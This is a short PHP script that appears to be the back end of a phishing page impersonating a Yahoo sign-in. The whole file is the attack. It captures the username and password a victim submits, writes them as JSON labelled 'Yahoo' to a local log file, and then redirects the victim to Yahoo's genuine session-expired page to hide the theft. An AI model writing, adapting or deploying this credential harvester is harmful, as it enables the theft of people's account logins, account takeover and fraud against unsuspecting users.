<?php

header('Location: https://login.yahoo.com/account/challenge/session-expired');
$data = array('site' => 'Yahoo',
  'user' => $_POST['username'],
  'pass' => $_POST['password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>